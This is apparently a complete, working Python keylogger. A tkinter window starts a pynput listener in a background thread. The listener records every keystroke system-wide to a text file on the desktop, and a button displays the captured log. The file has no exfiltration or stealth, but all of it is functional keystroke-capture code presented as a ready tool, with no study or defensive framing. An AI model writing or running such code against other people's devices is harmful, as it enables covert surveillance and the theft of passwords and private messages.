import tkinter as tk
from tkinter import messagebox
from pynput import keyboard
import threading
import os

# Global variable to control the keylogger thread
keylogger_running = False

# Function to start keylogger
def start_keylogger():
    global keylogger_running
    if keylogger_running:
        messagebox.showwarning("Warning", "Keylogger is already running!")
        return

    keylogger_running = True

    def on_press(key):
        try:
            with open("C:\\Users\\User\\Desktop\\key_log.txt", "a") as log_file:
                log_file.write(f"{key.char}")
        except AttributeError:
            with open("C:\\Users\\User\\Desktop\\key_log.txt", "a") as log_file:
                log_file.write(f"{key}")

    def start_logging():
        with keyboard.Listener(on_press=on_press) as listener:
            listener.join()

    # Start the keylogger in a separate thread
    thread = threading.Thread(target=start_logging)
    thread.start()

    messagebox.showinfo("Started", "Keylogger has started.")

# Function to stop keylogger
def stop_keylogger():
    global keylogger_running
    if not keylogger_running:
        messagebox.showwarning("Warning", "Keylogger is not running!")
        return

    keylogger_running = False
    os._exit(0)  # Forcefully stop all threads

# Function to view the log file
def view_log():
    log_file_path = "C:\\Users\\User\\Desktop\\key_log.txt"
    if os.path.exists(log_file_path):
        with open(log_file_path, "r") as log_file:
            logs = log_file.read()
        log_window = tk.Toplevel(root)
        log_window.title("Key Logs")
        log_text = tk.Text(log_window)
        log_text.insert(tk.END, logs)
        log_text.pack(expand=True, fill=tk.BOTH)
    else:
        messagebox.showwarning("Warning", "Log file does not exist.")

# Create the main application window
root = tk.Tk()
root.title("Simple Keylogger")
root.geometry("400x200")

# Start Button
start_button = tk.Button(root, text="Start Keylogger", command=start_keylogger)
start_button.pack(pady=10)

# Stop Button
stop_button = tk.Button(root, text="Stop Keylogger", command=stop_keylogger)
stop_button.pack(pady=10)

# View Log Button
view_log_button = tk.Button(root, text="View Log", command=view_log)
view_log_button.pack(pady=10)

# Start the Tkinter event loop
root.mainloop()
